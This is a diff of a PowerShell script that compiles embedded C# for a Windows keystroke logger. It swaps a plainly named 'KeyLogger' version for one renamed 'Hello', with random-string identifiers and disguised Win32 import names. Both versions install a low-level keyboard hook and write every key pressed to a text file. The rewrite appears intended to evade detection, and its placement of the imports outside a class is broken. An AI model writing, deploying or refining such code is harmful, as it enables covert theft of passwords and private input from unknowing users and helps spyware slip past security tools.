@@ -4,56 +4,44 @@ using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-
-namespace KeyLogger {
-  public static class Program {
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-
-    private const string logFileName = "log.txt";
-    private static StreamWriter logFile;
-
-    private static HookProc hookProc = HookCallback;
-    private static IntPtr hookId = IntPtr.Zero;
-
-    public static void Main() {
-      logFile = File.AppendText(logFileName);
-      logFile.AutoFlush = true;
-
-      hookId = SetHook(hookProc);
-      Application.Run();
-      UnhookWindowsHookEx(hookId);
-    }
-
-    private static IntPtr SetHook(HookProc hookProc) {
-      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
-      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
-    }
-
-    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
-      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-        int vkCode = Marshal.ReadInt32(lParam);
-        logFile.WriteLine((Keys)vkCode);
-      }
-
-      return CallNextHookEx(hookId, nCode, wParam, lParam);
-    }
-
+namespace Hello {
     [DllImport("user32.dll")]
-    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
-
+    private static extern IntPtr fddsafdsaf(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
     [DllImport("user32.dll")]
-    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-
+    private static extern bool gffdsgfdsgsd(IntPtr hhk);
     [DllImport("user32.dll")]
-    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-
+    private static extern IntPtr hgfshgfdhgfd(IntPtr hhk, int kfhfdskfjhdsf, IntPtr gfdsgfdsgfdsg, IntPtr sfdgfdsgfdsgfds);
     [DllImport("kernel32.dll")]
-    private static extern IntPtr GetModuleHandle(string lpModuleName);
+    private static extern IntPtr hgffdhgfdhgdf(string lpModuleName);
+    public static class Program {
+    private const int fgfdshgfhgfdh = 13;
+    private static HookProc fksfdjsg = HookCallback;
+    private const string kdhfiurewriugh = "lol.txt";
+    private const int jdfhdksahfkdsa = 16;
+    private static StreamWriter gfdfdgshfhshgsh;
+    private const int fkjdsfkdsfds = 12;
+    private const int hgfhgfdgfdhgf = 0x0100;
+    private static IntPtr fdhgfdsgfdsgfds = IntPtr.Zero;
+    public static void Main() {
+      gfdfdgshfhshgsh = File.AppendText(kdhfiurewriugh);
+      gfdfdgshfhshgsh.AutoFlush = true;
+      fdhgfdsgfdsgfds = SetHook(fksfdjsg);
+      Application.Run();
+      gffdsgfdsgsd(fdhgfdsgfdsgfds);
+    }
+    private static IntPtr SetHook(HookProc fksfdjsg) {
+      IntPtr fdshkjfdshs = hgffdhgfdhgdf(Process.GetCurrentProcess().MainModule.ModuleName);
+      return fddsafdsaf(fgfdshgfhgfdh, fksfdjsg, fdshkjfdshs, 0);
+    }
+    private delegate IntPtr HookProc(int kfhfdskfjhdsf, IntPtr gfdsgfdsgfdsg, IntPtr sfdgfdsgfdsgfds);
+    private static IntPtr HookCallback(int kfhfdskfjhdsf, IntPtr gfdsgfdsgfdsg, IntPtr sfdgfdsgfdsgfds) {
+      if (kfhfdskfjhdsf >= 0 && gfdsgfdsgfdsg == (IntPtr)hgfhgfdgfdhgf) {
+        int jsfghgsfjfdshgfh = Marshal.ReadInt32(sfdgfdsgfdsgfds);
+        gfdfdgshfhshgsh.WriteLine((Keys)jsfghgsfjfdshgfh);
+      }
+      return hgfshgfdhgfd(fdhgfdsgfdsgfds, kfhfdskfjhdsf, gfdsgfdsgfdsg, sfdgfdsgfdsgfds);
+    }
   }
 }
 "@ -ReferencedAssemblies System.Windows.Forms
-
-[KeyLogger.Program]::Main();
+[Hello.Program]::Main();
